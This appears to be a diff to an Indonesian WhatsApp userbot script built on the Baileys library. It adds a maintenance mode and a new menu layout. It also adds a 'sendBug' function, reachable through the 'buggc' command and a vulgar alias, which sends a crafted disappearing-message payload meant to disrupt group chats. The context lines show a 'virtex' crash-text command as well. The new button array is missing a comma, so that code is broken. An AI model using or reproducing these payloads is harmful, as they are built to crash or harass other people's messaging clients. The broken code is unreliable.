@@ -59,6 +59,7 @@ selfnya = true
 multi = true
 nopref = false
 prefa = 'z'
+maintenance = false
 autongetik = false
 autovn = false
 
@@ -350,6 +351,26 @@ headerType: 'IMAGE'
 }
 conn.sendMessage(id, buttonMessages, MessageType.buttonsMessage, {quoted : mek}, options)
 }
+const sendButLocation = async (id, text1, desc1, loc1, but = [], options = {}) => {
+kma = loc1
+mhan = await conn.prepareMessage(from, kma, location)
+const buttonMessages = {
+locationMessage: mhan.message.locationMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: "LOCATION"
+}
+conn.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+const sendBug = async (target) => {
+      await conn.relayWAMessage(
+        conn.prepareMessageFromContent(
+          target,
+          conn.prepareDisappearingMessageSettingContent(0),
+          {}
+        ),{ waitForAck: true }) 
+    }
 switch( evalnya ) {
 case'$':
 if (!mek.key.fromMe) return 
@@ -395,14 +416,18 @@ if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b
 //SETTING STATUS
 let settingstatus = 0;
     if (new Date() * 1 - settingstatus > 1000) {
-      let _uptime = process.uptime() * 1000;
+      let _uptime = process.uptime()
       let uptime = kyun(_uptime);
 
-await conn.setStatus(`ADII-USERBOT | Mode : ${selfnya ? 'SELF-MODE' : 'PUBLIC-MODE'} | Aktif Selama ${uptime}`).catch((_) => _);
+await conn.setStatus(`Mode : ${selfnya ? 'SELF-MODE' : 'PUBLIC-MODE'} | Aktif Selama ${uptime}`).catch((_) => _);
       settingstatus = new Date() * 1;
     }
 
 if (!mek.key.fromMe && selfnya === true ) return
+if (!mek.key.fromMe && maintenance === true ) return reply(`Maaf... Bot sedang maintenance
+
+tunggu aja:v`)
+
 //************************[COMMADO]************************\\
 switch(command || commando) {
 case 'status':
@@ -411,35 +436,22 @@ imgreply(`STATUS BOTZ\n${selfnya ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
 
 case 'menu':
 case 'help':
-runzz = process.uptime()
-bjirnya = `${kyun(runzz)}`
-sendButMessage(
-from,
-`Hello ${pushname}
-
-🔖 _Runtime : ${bjirnya}_
-🔖 _Time : ${time}_
-🔖 _Prefix : ${prefix}_
-🔖 _Lib : @adiwajshing/baileys_
-`,
-`_Jika button tidak muncul_
-_silahkan ketik .command_`,
- [
- {
-buttonId: `command`,
-buttonText: {
-displayText: `⎙ ALL COMMANDS`,
-},
-type: 1,
-},
-{
-buttonId: `sc`,
-buttonText: {
-displayText: `🔖 SCRIPT BOTZ`,
-},
-type: 1,
-},
-])
+const buttonwws = [
+  {buttonId: `command`, buttonText: {displayText: `Commands`}, type: 1}
+  {buttonId: `sc`, buttonText: {displayText: `Sc gw`}, type: 1}
+]
+    const buttonMessagwwe = {
+    	"locationMessage": {
+            "name": "CUMA SELFBOT",
+            "url": "https://telegra.ph/file/2758c1f4c852cd7d1f206.jpg",
+            "jpegThumbnail": null
+ },
+    contentText: `Hai kak ${pushname}\nAda Yang Bisa Dibantu?`,
+    footerText: '© Adii',
+    buttons: buttonwws,
+    headerType: 6
+}
+conn.sendMessage(from, buttonMessagwwe, MessageType.buttonsMessage,{quoted: ftroli})
 break
 
 case'command':
@@ -476,6 +488,13 @@ if (!mek.key.fromMe) return reply('Only Owner')
 conn.sendMessage(from, virtex(f), text, {quoted: ftoko})
 break
 
+case 'buggc':
+case 'memek':
+if (!isGroup) return reply(mess.OnlyGrup);
+if (!mek.key.fromMe) return
+sendBug(from)
+break
+
 case 'runtime':
 runtime = process.uptime()
 teks = `${kyun(runtime)}`
@@ -507,7 +526,7 @@ break
     break
 
 case 'owner': case 'creator':
-sendKontak(from, '60199782326', `Creator ${conn.user.name}`, 'Wkwk')
+sendKontak(from, '60199782326', `NIH`, 'Wkwk')
 break
 
 case 'tes':
@@ -714,6 +733,7 @@ break
            
 case 'setprefix2':
 foc = args.join(' ')
+multi = false
 prefix = foc
 imgreply(`berhasil mengubah ke ${foc}`)
 break
